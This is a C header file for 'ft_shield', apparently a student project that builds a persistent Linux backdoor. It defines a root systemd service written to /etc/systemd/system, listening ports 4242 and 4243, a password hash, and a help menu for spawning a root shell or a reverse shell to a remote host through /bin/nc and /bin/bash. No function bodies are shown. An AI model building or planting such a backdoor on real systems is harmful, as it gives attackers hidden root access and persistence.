#ifndef FT_SHIELD
#define FT_SHIELD

#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <sys/select.h>
#include <openssl/sha.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/file.h>
#include <signal.h>

#define STUDENT_LOGIN        "flmarsil\n"

#define TARGET_PATH         "/usr/bin/ft_shield"

#define PROC_SELF_EXE       "/proc/self/exe"

#define DAEMON_PORT         4242
#define BACKDOOR_PORT       4243

#define BACKDOOR_MSG        "spawning shell on port 4243\n"
#define BACKDOOR_MSG_LEN    28

#define RSHELL_MSG          "connection from reverse shell done\n"
#define RSHELL_MSG_LEN      36

#define MAX_CLIENTS         3
#define MAX_CLIENTS_ERR     "number of simultaneous connections reached\n"
#define MAX_CLIENT_ERR_LEN  43

#define PASSWORD_HASH       "07f116b3dca58c17c6079bba83126329209bd6a9e8a2c7ad1503ae4d299596a0"
#define PASSWORD_HASH_LEN   65

#define BUFFER_SIZE         4096

#define SH_PROMPT           "$> "
#define SH_PROMPT_LEN       3

#define ASK_KEYCODE         "Keycode: "
#define ASK_KEYCODE_LEN     9

#define CMD_NOT_FOUND       "ft_shield: command not found: use 'help' to get help menu\n"
#define CMD_NOT_FOUND_LEN   58

#define CMD_HELP            "\nft_shield backdoor help menu :\n"\
                            "commands :\n"\
                            "   - help   : list all commands\n"\
                            "   - shell  : run root shell on infected target\n"\
                            "   - rshell : run reverse shell from infected target : rshell <RHOST> <RPORT>\n"\
                            "   - log    : displays all commands typed during a session\n"\
                            "   - exit   : exit ft_shield backdoor\n\n"
#define CMD_HELP_LEN        300

#define NC_PATH             "/bin/nc"
#define BASH_PATH           "/bin/bash"

#define SERVICE_FILE        "[Unit]\n"\
                            "Description=FT Shield Service\n"\
                            "\n"\
                            "[Service]\n"\
                            "User=root\n"\
                            "WorkingDirectory=/\n"\
                            "ExecStart=/usr/bin/ft_shield\n"\
                            "Restart=always\n"\
                            "RestartSec=5s\n"\
                            "\n"\
                            "[Install]\n"\
                            "WantedBy=multi-user.target\n"

#define SERVICE_FILE_PATH   "/etc/systemd/system/ft_shield.service"

#define RSHELL_ERROR        "ft_shield: syntax error for 'rshell' command\n" 
#define RSHELL_ERROR_LEN    45

typedef struct          s_client {
    int                 socket;
    bool                auth;
    char               logs[BUFFER_SIZE];
}                       t_client;

typedef struct          s_server {
    int                 socket;
    int                 max_socket;
    int                 nb_connection;
    fd_set              fds_read;
    fd_set              fds_write;
    fd_set              fds_current;
    t_client            clients[MAX_CLIENTS];
}                       t_server;

// cmd.c 
void command_shell(t_server* server, t_client* client);
void command_reverse_shell(t_server* server, t_client* client, char* rhost, char* rport);
void command_log(t_server* server, t_client* client);
// daemon,c
void daemonize_program();
void exit_properly(int exit_code);
// handlers.c
void client_connection_handler(t_server* server);
void client_authentication_handler(t_server* server, t_client* client, char* buf, size_t nbytes);
void client_command_handler(t_server* server, t_client* client, char* buf, size_t nbytes);
// server.c
void delete_client(t_server* server, int client_socket);
void run_server();
// sha256.c
void sha256(const char* str, char output[65]);
// main.c
void signals_handler();

#endif
